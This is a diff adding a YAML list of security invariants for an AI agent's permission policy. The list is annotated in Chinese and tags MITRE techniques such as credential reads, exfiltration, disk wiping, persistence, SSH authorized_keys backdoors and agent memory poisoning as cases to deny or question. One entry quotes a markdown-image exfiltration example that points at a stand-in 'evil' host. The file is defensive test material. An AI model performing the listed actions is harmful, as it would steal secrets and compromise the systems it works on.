@@ -1,0 +1,132 @@
+invariants:
+  # —— 已覆盖类（预期 covered）——
+  - id: TINV-CRED-01
+    source: "T1552.004 / AML.T0037 Private Keys"
+    desc: "读取凭据文件必须 Deny"
+    expressible: true
+    precondition: {operation: [read], resource_class: [credential]}
+    min_decision: 2
+    prejudgment: covered
+  - id: TINV-CRED-07
+    source: "T1003.008 /etc/shadow,passwd"
+    desc: "读取系统敏感资源必须 Deny"
+    expressible: true
+    precondition: {operation: [read], resource_class: [system_sensitive]}
+    min_decision: 2
+    prejudgment: covered
+  - id: TINV-EXFIL-01
+    source: "T1041/T1048 通道无关机密外传（核心污点不变量）"
+    desc: "携带凭据污点外发到外部必须 Deny"
+    expressible: true
+    precondition: {operation: [send], target_zone: [external, unknown], flag_true: [taint_credential]}
+    min_decision: 2
+    prejudgment: covered
+  - id: TINV-DESTROY-01
+    source: "T1485 / AML.T0101 Data Destruction"
+    desc: "破坏性操作必须 Deny"
+    expressible: true
+    precondition: {flag_true: [destructive]}
+    min_decision: 2
+    prejudgment: covered
+  - id: TINV-DESTROY-02
+    source: "T1561.001 Disk Content Wipe"
+    desc: "覆写块设备（destructive）必须 Deny"
+    expressible: true
+    precondition: {operation: [write], flag_true: [destructive]}
+    min_decision: 2
+    prejudgment: covered
+  - id: TINV-PERSIST-01
+    source: "T1547/T1053 持久化入口"
+    desc: "持久化写入点必须 Deny"
+    expressible: true
+    precondition: {flag_true: [persistence]}
+    min_decision: 2
+    prejudgment: covered
+  - id: TINV-PRIVESC-01
+    source: "T1548 提权"
+    desc: "提权操作必须 Deny"
+    expressible: true
+    precondition: {flag_true: [privilege_esc]}
+    min_decision: 2
+    prejudgment: covered
+  - id: TINV-RECON-01
+    source: "T1046 网段/端口扫描"
+    desc: "内部侦察扫描必须 Deny"
+    expressible: true
+    precondition: {flag_true: [recon_scan]}
+    min_decision: 2
+    prejudgment: covered
+  - id: TINV-SUPPLY-01
+    source: "T1195 供应链隐藏执行"
+    desc: "供应链隐藏执行必须 Deny"
+    expressible: true
+    precondition: {flag_true: [supply_chain_exec]}
+    min_decision: 2
+    prejudgment: covered
+  - id: TINV-TLS-01
+    source: "T1562 削弱安全控制"
+    desc: "关闭/绕过安全控制必须 Deny"
+    expressible: true
+    precondition: {flag_true: [weakens_control]}
+    min_decision: 2
+    prejudgment: covered
+
+  # —— 缺口类（预期 gap：文档现有词表可表达，但规则漏了）——
+  - id: TINV-CRED-18
+    source: "T1098.004 SSH authorized_keys 写入（最经典 agent 后门）"
+    desc: "写入凭据文件应 Deny（文档凭据类通常只规定读，未规定写）"
+    expressible: true
+    precondition: {operation: [write], resource_class: [credential]}
+    min_decision: 2
+    prejudgment: gap
+  - id: TINV-CRED-03
+    source: "T1552.003 Bash History"
+    desc: "读取 shell 历史应至少 Ask"
+    expressible: true
+    precondition: {operation: [read], resource_class: [config], flag_false: [destructive]}
+    min_decision: 1
+    prejudgment: gap
+  - id: TINV-DESTROY-04
+    source: "T1490 Inhibit System Recovery（删 .git/备份）"
+    desc: "删除源代码/恢复点应至少 Ask（非 destructive 标记时会漏）"
+    expressible: true
+    precondition: {operation: [delete], resource_class: [source_code], flag_false: [destructive]}
+    min_decision: 1
+    prejudgment: gap
+  - id: TINV-EXFIL-11
+    source: "T1195 源代码外传"
+    desc: "携带代码污点外发应至少 Ask"
+    expressible: true
+    precondition: {operation: [send], target_zone: [external, unknown], resource_class: [source_code]}
+    min_decision: 1
+    prejudgment: gap
+  - id: TINV-PRIV-READ-MEM
+    source: "AML.T0083 Agent 配置/记忆读取"
+    desc: "读取 agent 记忆应至少 Ask（同级 private_context 有 Deny，memory 无）"
+    expressible: true
+    precondition: {operation: [read], resource_class: [agent_memory]}
+    min_decision: 1
+    prejudgment: gap
+
+  # —— 词表缺失类（预期 vocab-gap：现有可观察维度根本表达不了）——
+  - id: TINV-EXFIL-07
+    source: "AML.T0077 LLM Response Rendering（![](http://evil/?d=secret)）"
+    desc: "模型输出渲染外泄——需新增『模型输出内容』观察维度，非需求缺失"
+    expressible: false
+    precondition: {}
+    min_decision: 2
+    prejudgment: gap
+  - id: TINV-CRED-05
+    source: "T1552.007 Container API（/var/run/docker.sock）"
+    desc: "docker.sock 访问——文档系统敏感清单未含该资源类型"
+    expressible: false
+    precondition: {}
+    min_decision: 2
+    prejudgment: gap
+  - id: TINV-MEM-POISON
+    source: "跨会话记忆污染"
+    desc: "跨会话记忆污染——需新增『会话边界/写入内容来源』维度"
+    expressible: false
+    precondition: {}
+    min_decision: 1
+    prejudgment: gap
